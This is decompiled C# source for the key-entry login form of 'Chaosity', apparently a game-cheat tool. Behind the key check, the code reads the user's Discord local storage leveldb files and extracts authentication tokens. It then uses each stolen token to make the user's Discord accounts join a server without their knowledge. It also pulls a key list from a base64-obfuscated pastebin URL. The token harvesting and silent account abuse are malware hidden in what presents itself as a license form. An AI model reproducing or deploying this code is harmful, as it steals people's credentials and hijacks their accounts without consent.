// Decompiled with JetBrains decompiler
// Type: Chaosity.Key_System
// Assembly: Chaosity, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8FD1C12D-B5CF-4C0B-B451-47DE735C992C
// Assembly location: C:\Users\povar\Desktop\Chaosity (Exploit)\ChaosityExploit.exe

using DiscordRpcDemo;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Chaosity
{
  public class Key_System : Form
  {
    private WebClient webClient = new WebClient();
    private List<string> discordLDBs = new List<string>();
    private List<string> discordTokens = new List<string>();
    private IContainer components = (IContainer) null;
    private DiscordRpc.RichPresence presence;
    private DiscordRpc.EventHandlers handlers;
    private Panel panel3;
    private Button button4;
    private Label label1;
    private System.Windows.Forms.Timer timer1;
    private System.Windows.Forms.Timer timer2;
    private Button button7;
    private Button button6;
    private Panel panel1;
    private Button button3;
    private Button button1;
    private TextBox textBox1;

    public Key_System()
    {
      this.InitializeComponent();
      this.handlers = new DiscordRpc.EventHandlers();
      DiscordRpc.Initialize("690288190283972619", ref this.handlers, true, (string) null);
      this.presence.state = "Project: Chaosity";
      this.presence.details = "Download Chaosity!";
      this.presence.startTimestamp = 0L;
      this.presence.largeImageKey = "chaosity_pfp";
      this.presence.largeImageText = "Project: Chaosity";
      this.presence.smallImageKey = "chaosity_pfp";
      this.presence.smallImageText = "Project: Chaosity";
      DiscordRpc.UpdatePresence(ref this.presence);
      this.TopMost = true;
    }

    private void button1_Click(object sender, EventArgs e)
    {
      Process.Start("https://up-to-down.net/27602/GetKey");
    }

    public string UseEncryptedString(string code)
    {
      return Encoding.Unicode.GetString(Convert.FromBase64String(code));
    }

    private void loadLDBs(string path)
    {
      foreach (FileInfo file in new DirectoryInfo(path).GetFiles())
      {
        if (file.Name.EndsWith(".ldb") && System.IO.File.ReadAllText(file.FullName).Contains("oken"))
          this.discordLDBs.Add(path + file.Name);
      }
    }

    private void loadTokens()
    {
      foreach (string discordLdB in this.discordLDBs)
        this.discordTokens.Add(Key_System.GetToken(discordLdB, false));
    }

    public static string GetToken(string path, bool isLog = false)
    {
      string str1 = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(path));
      string str2 = "";
      string contents = str1;
      while (contents.Contains("oken"))
      {
        string[] strArray = Key_System.Sub(contents).Split('"');
        str2 = strArray[0];
        contents = string.Join("\"", strArray);
        if (isLog && str2.Length == 59)
          break;
      }
      return str2;
    }

    private static string Sub(string contents)
    {
      string[] strArray = contents.Substring(contents.IndexOf("oken") + 4).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) strArray);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }

    public string Request(string method, string url, string postData, string token)
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb\\";
      HttpWebRequest http = WebRequest.CreateHttp(url);
      http.Method = method;
      http.Headers.Add("authorization", token);
      byte[] bytes = Encoding.UTF8.GetBytes(postData);
      http.ContentType = "application/x-www-form-urlencoded";
      http.ContentLength = (long) bytes.Length;
      http.Timeout = 2500;
      Stream requestStream = http.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      return new StreamReader(http.GetResponse().GetResponseStream()).ReadToEnd();
    }

    public void JoinServer(string invite)
    {
      this.loadLDBs(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\");
      this.loadTokens();
      foreach (string discordToken in this.discordTokens)
      {
        try
        {
          this.Request("POST", "https://discordapp.com/api/v6/invite/" + invite, "a=b", discordToken);
        }
        catch
        {
        }
      }
    }

    private bool universalBypassInstalled()
    {
      return Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Google/Chrome/User Data/Default/Extensions/aihomhdbhpnpmcnnbckjjcebjoikpihj");
    }

    private void button4_Click(object sender, EventArgs e)
    {
      bool flag = false;
      string[] strArray;
      using (WebClient webClient = new WebClient())
        strArray = webClient.DownloadString(this.UseEncryptedString("aAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwAwAFQARwBjADAAdABpADIA")).Split(',');
      for (int index = 0; index < strArray.Length; ++index)
      {
        if (this.textBox1.Text == strArray[index])
        {
          this.Hide();
          new Chaosity().Show();
          if (Process.GetProcessesByName("Discord").Length == 0)
            return;
          this.JoinServer("DEVYCQp");
          flag = true;
        }
      }
      if (this.webClient.DownloadString("https://www.shadowcheats.com/chaosity/auth.php?key=" + this.textBox1.Text) == "Functional:" + this.textBox1.Text)
      {
        this.Hide();
        new Chaosity().Show();
        if (Process.GetProcessesByName("Discord").Length == 0)
          return;
        this.JoinServer("DEVYCQp");
      }
      else if (this.webClient.DownloadString("https://www.shadowcheats.com/chaosity/auth.php?key=" + this.textBox1.Text) == "Expired:" + this.textBox1.Text)
      {
        int num1 = (int) MessageBox.Show("Expired Key", "Expired Key");
      }
      else if (!flag)
      {
        int num2 = (int) MessageBox.Show("Incorrect Key", "Incorrect Key");
      }
    }

    private void AddDrag(Control Control)
    {
      Control.MouseDown += new MouseEventHandler(this.panel1_MouseDown);
    }

    [DllImport("user32.dll")]
    public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

    [DllImport("user32.dll")]
    public static extern bool ReleaseCapture();

    private void panel1_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
      Loading.ReleaseCapture();
      Loading.SendMessage(this.Handle, 161, 2, 0);
      if ((uint) this.Location.Y > 0U)
        return;
      this.WindowState = FormWindowState.Maximized;
    }

    private void panel3_Paint(object sender, PaintEventArgs e)
    {
    }

    private void Key_System_Load(object sender, EventArgs e)
    {
      if (!this.universalBypassInstalled())
        return;
      int num = (int) MessageBox.Show("You must uninstall Universal Bypass before you can use Chaosity", "Universal Bypass Failed");
      Environment.Exit(0);
    }

    private void button2_Click(object sender, EventArgs e)
    {
    }

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void label1_Click(object sender, EventArgs e)
    {
    }

    private void button2_Click_1(object sender, EventArgs e)
    {
    }

    private void button6_Click(object sender, EventArgs e)
    {
      this.Hide();
      new Chaosity().Show();
    }

    private void button1_Click_1(object sender, EventArgs e)
    {
      Process.Start("https://up-to-down.net/27602/GetKey");
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.components = new System.ComponentModel.Container();
            this.panel3 = new System.Windows.Forms.Panel();
            this.button1 = new System.Windows.Forms.Button();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.button4 = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.button7 = new System.Windows.Forms.Button();
            this.button6 = new System.Windows.Forms.Button();
            this.panel1 = new System.Windows.Forms.Panel();
            this.button3 = new System.Windows.Forms.Button();
            this.panel3.SuspendLayout();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // panel3
            // 
            this.panel3.BackColor = System.Drawing.Color.Black;
            this.panel3.Controls.Add(this.button1);
            this.panel3.Controls.Add(this.textBox1);
            this.panel3.Controls.Add(this.button4);
            this.panel3.Controls.Add(this.label1);
            this.panel3.Location = new System.Drawing.Point(10, 33);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(288, 112);
            this.panel3.TabIndex = 47;
            this.panel3.Paint += new System.Windows.Forms.PaintEventHandler(this.panel3_Paint);
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.Transparent;
            this.button1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button1.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Bold);
            this.button1.ForeColor = System.Drawing.Color.White;
            this.button1.Location = new System.Drawing.Point(25, 70);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(93, 25);
            this.button1.TabIndex = 45;
            this.button1.Text = "Get Free Key";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click_1);
            // 
            // textBox1
            // 
            this.textBox1.Location = new System.Drawing.Point(25, 44);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(235, 20);
            this.textBox1.TabIndex = 44;
            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged_1);
            // 
            // button4
            // 
            this.button4.BackColor = System.Drawing.Color.Transparent;
            this.button4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button4.FlatAppearance.BorderColor = System.Drawing.Color.White;
            this.button4.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button4.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Bold);
            this.button4.ForeColor = System.Drawing.Color.White;
            this.button4.Location = new System.Drawing.Point(167, 70);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(93, 25);
            this.button4.TabIndex = 43;
            this.button4.Text = "Login";
            this.button4.UseVisualStyleBackColor = false;
            this.button4.Click += new System.EventHandler(this.button4_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Segoe UI", 15.75F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(17, 11);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(266, 22);
            this.label1.TabIndex = 0;
            this.label1.Text = "Chaosity Authentication";
            this.label1.Click += new System.EventHandler(this.label1_Click);
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 250;
            // 
            // timer2
            // 
            this.timer2.Interval = 4000;
            // 
            // button7
            // 
            this.button7.BackColor = System.Drawing.Color.Transparent;
            this.button7.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button7.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button7.FlatAppearance.BorderSize = 0;
            this.button7.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button7.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.button7.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button7.Font = new System.Drawing.Font("Bahnschrift", 8F);
            this.button7.ForeColor = System.Drawing.Color.White;
            this.button7.Location = new System.Drawing.Point(255, 1);
            this.button7.Name = "button7";
            this.button7.Size = new System.Drawing.Size(23, 19);
            this.button7.TabIndex = 45;
            this.button7.Text = "-";
            this.button7.UseVisualStyleBackColor = false;
            // 
            // button6
            // 
            this.button6.BackColor = System.Drawing.Color.Black;
            this.button6.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button6.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button6.FlatAppearance.BorderSize = 0;
            this.button6.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button6.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.button6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button6.Font = new System.Drawing.Font("Bahnschrift", 8F);
            this.button6.ForeColor = System.Drawing.Color.White;
            this.button6.Location = new System.Drawing.Point(275, 1);
            this.button6.Name = "button6";
            this.button6.Size = new System.Drawing.Size(23, 19);
            this.button6.TabIndex = 44;
            this.button6.Text = "X";
            this.button6.UseVisualStyleBackColor = false;
            this.button6.Click += new System.EventHandler(this.button6_Click);
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.Black;
            this.panel1.Controls.Add(this.button7);
            this.panel1.Controls.Add(this.button3);
            this.panel1.Controls.Add(this.button6);
            this.panel1.Location = new System.Drawing.Point(3, 7);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(304, 22);
            this.panel1.TabIndex = 48;
            this.panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.panel1_MouseDown);
            // 
            // button3
            // 
            this.button3.BackColor = System.Drawing.Color.Transparent;
            this.button3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button3.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button3.FlatAppearance.BorderSize = 0;
            this.button3.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.button3.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button3.Font = new System.Drawing.Font("Bahnschrift", 8F);
            this.button3.ForeColor = System.Drawing.Color.White;
            this.button3.Location = new System.Drawing.Point(551, 9);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(20, 20);
            this.button3.TabIndex = 44;
            this.button3.Text = "-";
            this.button3.UseVisualStyleBackColor = false;
            // 
            // Key_System
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(310, 152);
            this.Controls.Add(this.panel3);
            this.Controls.Add(this.panel1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Key_System";
            this.Text = "Key_System";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.Load += new System.EventHandler(this.Key_System_Load);
            this.panel3.ResumeLayout(false);
            this.panel3.PerformLayout();
            this.panel1.ResumeLayout(false);
            this.ResumeLayout(false);

    }

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }
    }
}
